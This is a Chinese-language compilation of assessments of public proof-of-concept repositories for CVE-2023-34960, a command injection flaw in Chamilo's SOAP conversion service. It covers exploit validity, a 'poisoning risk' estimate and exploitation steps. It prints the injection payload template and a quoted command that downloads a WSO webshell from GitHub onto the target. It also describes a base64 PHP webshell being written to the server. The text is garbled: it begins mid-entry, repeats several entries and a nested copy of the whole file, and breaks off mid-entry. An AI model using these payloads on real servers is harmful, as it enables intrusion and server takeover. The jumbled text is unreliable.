CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #4

**来源**: [CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md](../2023/CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.11.* up to 1.11.18

**利用条件:** 需要网络访问，目标系统开启wsConvertPpt组件的SOAP API。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo 1.11.18及更早版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的PowerPoint文件名，并通过SOAP API调用wsConvertPpt组件来执行任意命令。

**有效性评估：**

漏洞库信息、搜索引擎结果和提供的PoC代码均表明该漏洞是有效的。多个来源都描述了相同的漏洞原理，即通过SOAP API注入恶意命令。提供的PoC代码是一个Python脚本，它构造一个包含恶意PowerPoint文件名的SOAP请求，利用该漏洞在目标系统上执行命令。Metasploit也收录了此漏洞的利用模块,可以佐证漏洞的有效性。

**投毒风险评估：**

PoC代码本身未发现明显的恶意代码（例如，下载和执行任意文件）。然而，存在轻微的投毒风险，概率约为10%。这种风险主要来自以下几个方面：

*   **依赖项：** PoC代码依赖于`requirements.txt`中指定的Python库。虽然常见库如`requests`是安全的，但如果`requirements.txt`中包含不常见的或来源不明的库，则可能存在恶意代码。需要人工审核`requirements.txt`文件，检查是否存在可疑的依赖关系。
*   **代码逻辑：** 虽然主要代码看起来是直接利用漏洞，但作者可以在脚本中添加隐蔽的后门或数据收集代码，例如向特定服务器发送目标信息。
*   **作者声明：** 作者免责声明暗示该脚本存在潜在风险，用户需要自行承担使用风险。
*  **README.md中的图片链接:** 链接到外部资源，可能存在被替换为恶意图片的风险。

**利用方式：**

1.  **目标确定：** 确定目标Chamilo实例的版本是否在受影响范围内 (1.11.* up to 1.11.18)。
2.  **SOAP请求构造：** 构造一个SOAP请求，其中`file_name`参数包含恶意命令。命令注入发生在PowerPoint文件名处理过程中。
3.  **API调用：** 将构造的SOAP请求发送到Chamilo的wsConvertPpt组件的API端点。通常可以通过分析Chamilo的`additional_webservices.php`文件来确定SOAP端点。
4.  **命令执行：** 如果漏洞利用成功，服务器将执行注入的命令。攻击者可以执行系统命令，例如反弹shell或读取敏感文件。

提供的PoC代码中，注入payload如下：

```xml
<value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value>
```

其中`{command}`将被替换为攻击者希望执行的命令。

总而言之，该漏洞利用的有效性高，但存在轻微的投毒风险。用户在使用PoC代码时应谨慎，并仔细检查代码和依赖项。

**项目地址:** [ThatNotEasy/CVE-2023-34960](https://github.com/ThatNotEasy/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #5

**来源**: [CVE-2023-34960-YongYe-Security_CVE-2023-34960.md](../2023/CVE-2023-34960-YongYe-Security_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要网络访问，目标系统运行着存在漏洞的Chamilo版本，并且可以访问到/main/webservices/additional_webservices.php SOAP接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Chamilo的wsConvertPpt组件中。攻击者可以通过构造恶意的SOAP请求，在PPT文件名中注入命令，从而执行任意代码。 

**有效性分析：**
提供的POC代码`CVE-2023-34960.py`看起来有效。它构造了一个带有恶意`file_name`的SOAP请求，发送到`/main/webservices/additional_webservices.php`。代码会打印执行结果，并将存在漏洞的URL保存到`Kill_ALL.txt`。

**投毒风险分析：**
查看了提供的`CVE-2023-34960.py`和`README.md`的内容，没有发现任何明显的投毒代码。EXP的代码逻辑是，发送SOAP请求，获取并打印返回结果，没有发现恶意行为。`README.md`文件主要是使用说明，没有发现可疑代码。

**利用方式：**
1.  **确定目标：** 确定要攻击的Chamilo实例的URL。
2.  **构造SOAP请求：** 使用POC脚本，构造一个SOAP请求，其中`file_name`包含要执行的命令。命令注入发生在PPT文件名，payload的格式为``{{}}`.pptx'|" |{command}||a #`，其中`{command}`是要执行的命令。
3.  **发送请求：** 将SOAP请求发送到`/main/webservices/additional_webservices.php`。
4.  **执行命令：** 服务器执行注入的命令。
5.  **获取结果：**  从SOAP响应中提取命令执行结果。

**总结：**
该漏洞利用过程相对简单，利用POC发送构造好的SOAP数据包即可完成利用。

**项目地址:** [YongYe-Security/CVE-2023-34960](https://github.com/YongYe-Security/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #6

**来源**: [CVE-2023-34960-dvtarsoul_ChExp.md](../2023/CVE-2023-34960-dvtarsoul_ChExp.md)

# CVE-2023-34960

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-34960-Aituglo_CVE-2023-34960.md](../2023/CVE-2023-34960-Aituglo_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.* up to v1.11.18

**利用条件:** 需要能够访问 Chamilo 实例的 web 服务接口 (additional_webservices.php)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11 到 1.11.18 版本中 wsConvertPpt 组件的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的 PowerPoint 文件名，通过 SOAP API 调用 wsConvertPpt 函数来执行任意系统命令。

**漏洞利用方式：**

1.  **攻击入口:** 攻击者需要能够访问 `additional_webservices.php` Web 服务接口。
2.  **SOAP 请求构造:** 攻击者构造一个 SOAP 请求，其中包含 `wsConvertPpt` 方法的调用。
3.  **命令注入:**  在 SOAP 请求的 `file_name` 参数中，攻击者插入包含恶意命令的字符串。由于未进行充分的输入验证和过滤，Chamilo 会将此字符串传递给系统命令执行函数。
4.  **命令执行:**  当 Chamilo 尝试处理（实际上可能不会处理） PowerPoint 文件时，注入的命令会被执行。

**POC 分析:**

提供的 POC 代码 `poc.py` 的工作原理如下：

1.  **构造 SOAP 请求:**  Python 脚本构造包含恶意 `file_name` 的 SOAP 请求，格式化字符串将用户提供的 `command` 插入到 `file_name` 中。
2.  **发送请求:**  脚本使用 `requests` 库向目标 Chamilo 实例的 `additional_webservices.php` 发送 POST 请求，请求体是构造的 SOAP 消息。
3.  **验证响应:**  脚本检查 HTTP 响应状态码是否为 200，以及响应正文中是否包含字符串 `wsConvertPptResponse`，以此判断漏洞是否可能存在以及命令是否可能执行成功。
4.  **命令执行与输出:** 通过 `-c` 参数可以执行任意指令.

**有效性评估:**
根据漏洞描述，搜索引擎结果以及提供的 POC 代码分析，此漏洞利用是有效的。

**投毒风险评估:**

分析提供的 POC 代码，没有发现任何可疑的或恶意的代码，该脚本目的明确，即利用命令注入漏洞，因此不存在投毒的风险。



**项目地址:** [Aituglo/CVE-2023-34960](https://github.com/Aituglo/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #2

**来源**: [CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md](../2023/CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要能够访问Chamilo服务器上的`additional_webservices.php`，并发送特制的SOAP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Chamilo的`wsConvertPpt`组件中，允许攻击者通过构造包含恶意命令的PowerPoint文件名，利用SOAP API调用执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果以及提供的PoC代码，该漏洞利用的有效性较高。多个来源都确认了该漏洞的存在，并且提供了利用该漏洞的PoC代码。Metasploit也集成了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

查看提供的PoC代码（`CVE-2023-34960.py`）后，发现其主要功能是：

1.  构造包含恶意命令的SOAP请求，发送到`/main/webservices/additional_webservices.php`。
2.  恶意命令是将一段PHP代码（base64编码的webshell）写入到 `shin.php` 文件中.
3.  尝试访问`/main/inc/lib/ppt2png/1.php`以确认webshell是否上传成功。

`README.md` 文件提供了简单的使用说明，没有发现明显的恶意代码。

**潜在的投毒风险在于：**

*   PoC中使用的webshell功能简单，可能只是为了演示漏洞。攻击者可以修改PoC，植入更复杂的后门代码。
*   PoC在成功利用漏洞后，会在目标服务器上留下webshell文件（`/main/inc/lib/ppt2png/1.php`），如果该文件被其他攻击者发现，可能会被用于进一步的攻击。

该风险是由于漏洞利用本身造成的后门，并非作者故意添加的恶意代码，判定投毒风险为10%。

**利用方式：**

1.  攻击者需要确定目标Chamilo服务器的版本在v1.11.* 到 v1.11.18之间。
2.  攻击者需要向目标服务器的`/main/webservices/additional_webservices.php`发送特制的SOAP请求。
3.  SOAP请求中的`file_name`参数需要包含恶意命令。PoC中使用的命令是将base64编码的PHP webshell写入`/main/inc/lib/ppt2png/1.php`文件。
4.  攻击者可以通过访问`/main/inc/lib/ppt2png/1.php`来执行webshell，从而控制目标服务器。
5.  该脚本会自动在 `vuln_chamilo.txt` 和 `shell_chamilo.txt` 中记录存在漏洞的URL以及成功获取shell的URL。

**项目地址:** [Jenderal92/CHAMILO-CVE-2023-34960](https://github.com/Jenderal92/CHAMILO-CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #3

**来源**: [CVE-2023-34960-Mantodkaz_CVE-2023-34960.md](../2023/CVE-2023-34960-Mantodkaz_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #4

**来源**: [CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md](../2023/CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.11.* up to 1.11.18

**利用条件:** 需要网络访问，目标系统开启wsConvertPpt组件的SOAP API。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo 1.11.18及更早版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的PowerPoint文件名，并通过SOAP API调用wsConvertPpt组件来执行任意命令。

**有效性评估：**

漏洞库信息、搜索引擎结果和提供的PoC代码均表明该漏洞是有效的。多个来源都描述了相同的漏洞原理，即通过SOAP API注入恶意命令。提供的PoC代码是一个Python脚本，它构造一个包含恶意PowerPoint文件名的SOAP请求，利用该漏洞在目标系统上执行命令。Metasploit也收录了此漏洞的利用模块,可以佐证漏洞的有效性。

**投毒风险评估：**

PoC代码本身未发现明显的恶意代码（例如，下载和执行任意文件）。然而，存在轻微的投毒风险，概率约为10%。这种风险主要来自以下几个方面：

*   **依赖项：** PoC代码依赖于`requirements.txt`中指定的Python库。虽然常见库如`requests`是安全的，但如果`requirements.txt`中包含不常见的或来源不明的库，则可能存在恶意代码。需要人工审核`requirements.txt`文件，检查是否存在可疑的依赖关系。
*   **代码逻辑：** 虽然主要代码看起来是直接利用漏洞，但作者可以在脚本中添加隐蔽的后门或数据收集代码，例如向特定服务器发送目标信息。
*   **作者声明：** 作者免责声明暗示该脚本存在潜在风险，用户需要自行承担使用风险。
*  **README.md中的图片链接:** 链接到外部资源，可能存在被替换为恶意图片的风险。

**利用方式：**

1.  **目标确定：** 确定目标Chamilo实例的版本是否在受影响范围内 (1.11.* up to 1.11.18)。
2.  **SOAP请求构造：** 构造一个SOAP请求，其中`file_name`参数包含恶意命令。命令注入发生在PowerPoint文件名处理过程中。
3.  **API调用：** 将构造的SOAP请求发送到Chamilo的wsConvertPpt组件的API端点。通常可以通过分析Chamilo的`additional_webservices.php`文件来确定SOAP端点。
4.  **命令执行：** 如果漏洞利用成功，服务器将执行注入的命令。攻击者可以执行系统命令，例如反弹shell或读取敏感文件。

提供的PoC代码中，注入payload如下：

```xml
<value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value>
```

其中`{command}`将被替换为攻击者希望执行的命令。

总而言之，该漏洞利用的有效性高，但存在轻微的投毒风险。用户在使用PoC代码时应谨慎，并仔细检查代码和依赖项。

**项目地址:** [ThatNotEasy/CVE-2023-34960](https://github.com/ThatNotEasy/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #5

**来源**: [CVE-2023-34960-YongYe-Security_CVE-2023-34960.md](../2023/CVE-2023-34960-YongYe-Security_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要网络访问，目标系统运行着存在漏洞的Chamilo版本，并且可以访问到/main/webservices/additional_webservices.php SOAP接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Chamilo的wsConvertPpt组件中。攻击者可以通过构造恶意的SOAP请求，在PPT文件名中注入命令，从而执行任意代码。 

**有效性分析：**
提供的POC代码`CVE-2023-34960.py`看起来有效。它构造了一个带有恶意`file_name`的SOAP请求，发送到`/main/webservices/additional_webservices.php`。代码会打印执行结果，并将存在漏洞的URL保存到`Kill_ALL.txt`。

**投毒风险分析：**
查看了提供的`CVE-2023-34960.py`和`README.md`的内容，没有发现任何明显的投毒代码。EXP的代码逻辑是，发送SOAP请求，获取并打印返回结果，没有发现恶意行为。`README.md`文件主要是使用说明，没有发现可疑代码。

**利用方式：**
1.  **确定目标：** 确定要攻击的Chamilo实例的URL。
2.  **构造SOAP请求：** 使用POC脚本，构造一个SOAP请求，其中`file_name`包含要执行的命令。命令注入发生在PPT文件名，payload的格式为``{{}}`.pptx'|" |{command}||a #`，其中`{command}`是要执行的命令。
3.  **发送请求：** 将SOAP请求发送到`/main/webservices/additional_webservices.php`。
4.  **执行命令：** 服务器执行注入的命令。
5.  **获取结果：**  从SOAP响应中提取命令执行结果。

**总结：**
该漏洞利用过程相对简单，利用POC发送构造好的SOAP数据包即可完成利用。

**项目地址:** [YongYe-Security/CVE-2023-34960](https://github.com/YongYe-Security/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #6

**来源**: [CVE-2023-34960-dvtarsoul_ChExp.md](../2023/CVE-2023-34960-dvtarsoul_ChExp.md)

# CVE-2023-34960

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-34960-Aituglo_CVE-2023-34960.md](../2023/CVE-2023-34960-Aituglo_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.* up to v1.11.18

**利用条件:** 需要能够访问 Chamilo 实例的 web 服务接口 (additional_webservices.php)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11 到 1.11.18 版本中 wsConvertPpt 组件的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的 PowerPoint 文件名，通过 SOAP API 调用 wsConvertPpt 函数来执行任意系统命令。

**漏洞利用方式：**

1.  **攻击入口:** 攻击者需要能够访问 `additional_webservices.php` Web 服务接口。
2.  **SOAP 请求构造:** 攻击者构造一个 SOAP 请求，其中包含 `wsConvertPpt` 方法的调用。
3.  **命令注入:**  在 SOAP 请求的 `file_name` 参数中，攻击者插入包含恶意命令的字符串。由于未进行充分的输入验证和过滤，Chamilo 会将此字符串传递给系统命令执行函数。
4.  **命令执行:**  当 Chamilo 尝试处理（实际上可能不会处理） PowerPoint 文件时，注入的命令会被执行。

**POC 分析:**

提供的 POC 代码 `poc.py` 的工作原理如下：

1.  **构造 SOAP 请求:**  Python 脚本构造包含恶意 `file_name` 的 SOAP 请求，格式化字符串将用户提供的 `command` 插入到 `file_name` 中。
2.  **发送请求:**  脚本使用 `requests` 库向目标 Chamilo 实例的 `additional_webservices.php` 发送 POST 请求，请求体是构造的 SOAP 消息。
3.  **验证响应:**  脚本检查 HTTP 响应状态码是否为 200，以及响应正文中是否包含字符串 `wsConvertPptResponse`，以此判断漏洞是否可能存在以及命令是否可能执行成功。
4.  **命令执行与输出:** 通过 `-c` 参数可以执行任意指令.

**有效性评估:**
根据漏洞描述，搜索引擎结果以及提供的 POC 代码分析，此漏洞利用是有效的。

**投毒风险评估:**

分析提供的 POC 代码，没有发现任何可疑的或恶意的代码，该脚本目的明确，即利用命令注入漏洞，因此不存在投毒的风险。



**项目地址:** [Aituglo/CVE-2023-34960](https://github.com/Aituglo/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #2

**来源**: [CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md](../2023/CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要能够访问Chamilo服务器上的`additional_webservices.php`，并发送特制的SOAP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Chamilo的`wsConvertPpt`组件中，允许攻击者通过构造包含恶意命令的PowerPoint文件名，利用SOAP API调用执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果以及提供的PoC代码，该漏洞利用的有效性较高。多个来源都确认了该漏洞的存在，并且提供了利用该漏洞的PoC代码。Metasploit也集成了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

查看提供的PoC代码（`CVE-2023-34960.py`）后，发现其主要功能是：

1.  构造包含恶意命令的SOAP请求，发送到`/main/webservices/additional_webservices.php`。
2.  恶意命令是将一段PHP代码（base64编码的webshell）写入到 `shin.php` 文件中.
3.  尝试访问`/main/inc/lib/ppt2png/1.php`以确认webshell是否上传成功。

`README.md` 文件提供了简单的使用说明，没有发现明显的恶意代码。

**潜在的投毒风险在于：**

*   PoC中使用的webshell功能简单，可能只是为了演示漏洞。攻击者可以修改PoC，植入更复杂的后门代码。
*   PoC在成功利用漏洞后，会在目标服务器上留下webshell文件（`/main/inc/lib/ppt2png/1.php`），如果该文件被其他攻击者发现，可能会被用于进一步的攻击。

该风险是由于漏洞利用本身造成的后门，并非作者故意添加的恶意代码，判定投毒风险为10%。

**利用方式：**

1.  攻击者需要确定目标Chamilo服务器的版本在v1.11.* 到 v1.11.18之间。
2.  攻击者需要向目标服务器的`/main/webservices/additional_webservices.php`发送特制的SOAP请求。
3.  SOAP请求中的`file_name`参数需要包含恶意命令。PoC中使用的命令是将base64编码的PHP webshell写入`/main/inc/lib/ppt2png/1.php`文件。
4.  攻击者可以通过访问`/main/inc/lib/ppt2png/1.php`来执行webshell，从而控制目标服务器。
5.  该脚本会自动在 `vuln_chamilo.txt` 和 `shell_chamilo.txt` 中记录存在漏洞的URL以及成功获取shell的URL。

**项目地址:** [Jenderal92/CHAMILO-CVE-2023-34960](https://github.com/Jenderal92/CHAMILO-CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #3

**来源**: [CVE-2023-34960-Mantodkaz_CVE-2023-34960.md](../2023/CVE-2023-34960-Mantodkaz_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #4

**来源**: [CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md](../2023/CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.11.* up to 1.11.18

**利用条件:** 需要网络访问，目标系统开启wsConvertPpt组件的SOAP API。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo 1.11.18及更早版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的PowerPoint文件名，并通过SOAP API调用wsConvertPpt组件来执行任意命令。

**有效性评估：**

漏洞库信息、搜索引擎结果和提供的PoC代码均表明该漏洞是有效的。多个来源都描述了相同的漏洞原理，即通过SOAP API注入恶意命令。提供的PoC代码是一个Python脚本，它构造一个包含恶意PowerPoint文件名的SOAP请求，利用该漏洞在目标系统上执行命令。Metasploit也收录了此漏洞的利用模块,可以佐证漏洞的有效性。

**投毒风险评估：**

PoC代码本身未发现明显的恶意代码（例如，下载和执行任意文件）。然而，存在轻微的投毒风险，概率约为10%。这种风险主要来自以下几个方面：

*   **依赖项：** PoC代码依赖于`requirements.txt`中指定的Python库。虽然常见库如`requests`是安全的，但如果`requirements.txt`中包含不常见的或来源不明的库，则可能存在恶意代码。需要人工审核`requirements.txt`文件，检查是否存在可疑的依赖关系。
*   **代码逻辑：** 虽然主要代码看起来是直接利用漏洞，但作者可以在脚本中添加隐蔽的后门或数据收集代码，例如向特定服务器发送目标信息。
*   **作者声明：** 作者免责声明暗示该脚本存在潜在风险，用户需要自行承担使用风险。
*  **README.md中的图片链接:** 链接到外部资源，可能存在被替换为恶意图片的风险。

**利用方式：**

1.  **目标确定：** 确定目标Chamilo实例的版本是否在受影响范围内 (1.11.* up to 1.11.18)。
2.  **SOAP请求构造：** 构造一个SOAP请求，其中`file_name`参数包含恶意命令。命令注入发生在PowerPoint文件名处理过程中。
3.  **API调用：** 将构造的SOAP请求发送到Chamilo的wsConvertPpt组件的API端点。通常可以通过分析Chamilo的`additional_webservices.php`文件来确定SOAP端点。
4.  **命令执行：** 如果漏洞利用成功，服务器将执行注入的命令。攻击者可以执行系统命令，例如反弹shell或读取敏感文件。

提供的PoC代码中，注入payload如下：

```xml
<value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value>
```

其中`{command}`将被替换为攻击者希望执行的命令。

总而言之，该漏洞利用的有效性高，但存在轻微的投毒风险。用户在使用PoC代码时应谨慎，并仔细检查代码和依赖项。

**项目地址:** [ThatNotEasy/CVE-2023-34960](https://github.com/ThatNotEasy/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #5

**来源**: [CVE-2023-34960-YongYe-Security_CVE-2023-34960.md](../2023/CVE-2023-34960-YongYe-Security_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要网络访问，目标系统运行着存在漏洞的Chamilo版本，并且可以访问到/main/webservices/additional_webservices.php SOAP接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Chamilo的wsConvertPpt组件中。攻击者可以通过构造恶意的SOAP请求，在PPT文件名中注入命令，从而执行任意代码。 

**有效性分析：**
提供的POC代码`CVE-2023-34960.py`看起来有效。它构造了一个带有恶意`file_name`的SOAP请求，发送到`/main/webservices/additional_webservices.php`。代码会打印执行结果，并将存在漏洞的URL保存到`Kill_ALL.txt`。

**投毒风险分析：**
